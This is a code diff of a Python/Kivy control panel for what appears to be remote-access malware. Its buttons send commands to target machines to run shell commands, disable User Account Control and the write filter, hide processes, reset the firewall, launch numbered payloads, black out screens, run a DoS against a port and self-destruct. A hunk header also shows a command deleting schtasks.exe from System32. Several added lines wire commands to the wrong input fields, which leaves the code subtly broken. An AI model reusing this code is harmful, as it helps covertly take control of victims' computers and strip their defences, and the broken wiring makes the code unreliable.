-                    Clock.schedule_once(lambda dt: self.showpopup_message("The scan for hosts was not able to identify any hosts, mayhaps you are confused with VAry?", "Scanner"), 0)
-                else:
-                    Clock.schedule_once(lambda dt: self.showpopup_message('The scan for hosts was not able to identify any hosts', "Scanner"), 0)
+                Clock.schedule_once(lambda dt: self.showpopup_message('The scan for hosts was not able to identify any hosts', "Scanner"), 0)
                         
         threadofscan = KThread(target=anT)
         threadofscan.start()
@@ -1930,7 +1314,7 @@ for i in range(threads_count_to):
         send(placeholder, f'runcmd{splitertextdiversified}{placeholder.root.ids.diversifyruncmd.text}', mode='diversify')
 
     def diversifyprogramvl2(placeholder):
-        send(placeholder, f'programvl2{splitertextdiversified}{placeholder.root.ids.diversifyprogramvl2.text}', mode='diversify')
+        send(placeholder, f'programvl2{splitertextdiversified}{placeholder.root.ids.diversifyruncmd.text}', mode='diversify')
 
     def diversifyblackenscreen(placeholder):
         send(placeholder, f'blackenscreen{splitertextdiversified}{placeholder.root.ids.diversifyblackenscreen.text}', mode='diversify')
@@ -1939,7 +1323,7 @@ for i in range(threads_count_to):
         send(placeholder, f'texttospeech{splitertextdiversified}{placeholder.root.ids.diversifytexttospeech.text}', mode='diversify')
 
     def diversifyspeakxlanguage(placeholder):
-        send(placeholder, f'speakxlanguage{splitertextdiversified}{placeholder.root.ids.diversifyspeakxlanguage.text}', mode='diversify')
+        send(placeholder, f'speakxlanguage{splitertextdiversified}{placeholder.root.ids.diversifytexttospeech.text}', mode='diversify')
 
     def diversifydisableuseraccountcontrol(placeholder):
         send(placeholder, 'disableuseraccountcontrol', mode='diversify')
@@ -2023,7 +1407,7 @@ for i in range(threads_count_to):
         send(placeholder, f'renameself{splitertextdiversified}{placeholder.root.ids.diversifyrenameself.text}', mode='diversify')
 
     def diversifyhideprocessvianame(placeholder):
-        send(placeholder, f'hideprocessvianame{splitertextdiversified}{placeholder.root.ids.diversifyhideprocessvianame.text}', mode='diversify')
+        send(placeholder, f'hideprocessvianame{splitertextdiversified}{placeholder.root.ids.diversifyshowprocessvianame.text}', mode='diversify')
 
     def diversifyshowprocessvianame(placeholder):
         send(placeholder, f'showprocessvianame{splitertextdiversified}{placeholder.root.ids.diversifyshowprocessvianame.text}', mode='diversify')
@@ -2048,13 +1432,11 @@ for i in range(threads_count_to):
     def diversifyonsmartassnointernet(placeholder):
         send(placeholder, 'onsmartassnointernet', mode='diversify')
 
-    # ... continue for all the other options
     def diversifydosipport(placeholder):
         send(placeholder, f'dosipport{splitertextdiversified}{placeholder.root.ids.diversifydosipport.text}', mode='diversify')
 
     def diversifyclosedosipport(placeholder):
         send(placeholder, f'closedosipport', mode='diversify')
-
 
     def diversifydisableuwf(placeholder):
         send(placeholder, 'disableuwf', mode='diversify')
@@ -2083,7 +1465,6 @@ for i in range(threads_count_to):
     def diversifyenablefirewall(placeholder):
         send(placeholder, 'enablefirewall', mode='diversify')
 
-        # ... continue for all the other options
     def diversifyrestarttoadvancedoptions(placeholder):
         send(placeholder, 'restarttoadvancedoptions', mode='diversify')
 
@@ -2186,27 +1567,32 @@ programVL2('del "C:\\Windows\\System32\\schtasks.exe"')
         send(placeholder, f'unblock_application_by_name{splitertextdiversified}{placeholder.root.ids.unblock_application_by_name.text}', mode='diversify') 
 
     def block_application_by_name(placeholder):
-        send(placeholder, f'block_application_by_name{splitertextdiversified}{placeholder.root.ids.block_application_by_name.text}', mode='diversify')
+        send(placeholder, f'block_application_by_name{splitertextdiversified}{placeholder.root.ids.unblock_application_by_name.text}', mode='diversify')
 
     def unblock_ports_for_application(placeholder):
         send(placeholder, f'unblock_ports_for_application{splitertextdiversified}{placeholder.root.ids.unblock_ports_for_application.text}', mode='diversify')
         
     def block_ports_for_application(placeholder):
-        send(placeholder, f'block_ports_for_application{splitertextdiversified}{placeholder.root.ids.block_ports_for_application.text}', mode='diversify')
+        send(placeholder, f'block_ports_for_application{splitertextdiversified}{placeholder.root.ids.unblock_ports_for_application.text}', mode='diversify')
 
     def reset_firewall(placeholder):
         send(placeholder, f'reset_firewall', mode='diversify')
 
     def diversifypayload_1(placeholder):
         send(placeholder, f'runfunctionviastring{splitertextdiversified}payload_1', mode='diversify')
+        
     def diversifypayload_2(placeholder):
         send(placeholder, f'runfunctionviastring{splitertextdiversified}payload_2', mode='diversify')
+        
     def diversifypayload_3(placeholder):
         send(placeholder, f'runfunctionviastring{splitertextdiversified}payload_3', mode='diversify')
+        
     def diversifypayload_4(placeholder):
         send(placeholder, f'runfunctionviastring{splitertextdiversified}payload_4', mode='diversify')
+        
     def diversifypayload_5(placeholder):
         send(placeholder, f'runfunctionviastring{splitertextdiversified}payload_5', mode='diversify')
+        
     def diversifypayload_6(placeholder):
         send(placeholder, f'runfunctionviastring{splitertextdiversified}payload_6', mode='diversify')
     
@@ -2215,14 +1601,52 @@ programVL2('del "C:\\Windows\\System32\\schtasks.exe"')
     
     def diversifyscreenflipped(placeholder):
         send(placeholder, f'runfunctionviastring{splitertextdiversified}flipscreen', mode='diversify')
+        
     def diversifyscreenlandscape(placeholder):
         send(placeholder, f'runfunctionviastring{splitertextdiversified}screenlandscape', mode='diversify')
+        
     def diversifyscreenportraitflipped(placeholder): # right
         send(placeholder, f'runfunctionviastring{splitertextdiversified}screenportraitflipped', mode='diversify')
+        
     def diversifyscreenportrait(placeholder): # left
         send(placeholder, f'runfunctionviastring{splitertextdiversified}screenportrait', mode='diversify')
 
+    def diversifyminimizeprocessvianame(placeholder):
+        send(placeholder, f'minimizeprocessvianame{splitertextdiversified}{placeholder.root.ids.diversifychangeapperanjceprocessvianame.text}', mode='diversify')
 
+    def diversifymaximizeprocessvianame(placeholder):
+        send(placeholder, f'maximizeprocessvianame{splitertextdiversified}{placeholder.root.ids.diversifychangeapperanjceprocessvianame.text}', mode='diversify')
+
+    def diversifyunprotectselffile(placeholder): 
+        send(placeholder, f'unprotectselffile', mode='diversify')
+
+    def diversifydvdtimeout(placeholder):
+        send(placeholder, f'dvdtimeout{splitertextdiversified}{placeholder.root.ids.diversifydvdtimeout.text}', mode='diversify')
+
+    def diversifyplayytvidbetweentime(placeholder):
+        send(placeholder, f'playytvidbetweentime{splitertextdiversified}{placeholder.root.ids.diversifyplayytvidbetweentimeurl.text}splitterofty1243{placeholder.root.ids.diversifyplayytvidbetweentimestarttime.text}splitterofty1243{placeholder.root.ids.diversifyplayytvidbetweentimeendtime.text}', mode='diversify')
+
+    def diversifyself_destruct(placeholder):
+        global selfdestructbuttonpresses
+        if selfdestructbuttonpresses > 3:
+            selfdestructbuttonpresses = 0
+            send(placeholder, f'self_destruct', mode='diversify')
+            Clock.schedule_once(lambda dt: vary().showpopup("Self destruct sent.", True), 0) 
+        else:
+            # Clock.schedule_once(lambda dt: self.showpopup_message('The scan for hosts was not able to identify any hosts', "Scanner"), 0)
+            # you need to press self destruct to confirm x more times
+            Clock.schedule_once(lambda dt: vary().showpopup_message(f'You need to press self destruct {5-selfdestructbuttonpresses} more times to confirm', "Self destruct"))
+            selfdestructbuttonpresses += 1
+
+    def diversifyalwaysontop(placeholder):
+        send(placeholder, f'alwaysontop{splitertextdiversified}{placeholder.root.ids.diversifyalwaysontop.text}', mode='diversify')
+    
+    def diversifyunsetalwaysontop(placeholder):
+        send(placeholder, f'unsetalwaysontop{splitertextdiversified}{placeholder.root.ids.diversifyalwaysontop.text}', mode='diversify')
+        
+    def diversifyplayytvidbetweentimefullscreen(placeholder):
+        send(placeholder, f'playytvidbetweentimefullscreen{splitertextdiversified}{placeholder.root.ids.diversifyplayytvidbetweentimeurlfullscreen.text}splitterofty1243{placeholder.root.ids.diversifyplayytvidbetweentimestarttimefullscreen.text}splitterofty1243{placeholder.root.ids.diversifyplayytvidbetweentimeendtimefullscreen.text}', mode='diversify')
+    
 def main(showerror = False, whatisError = None):
     global amirunning
     
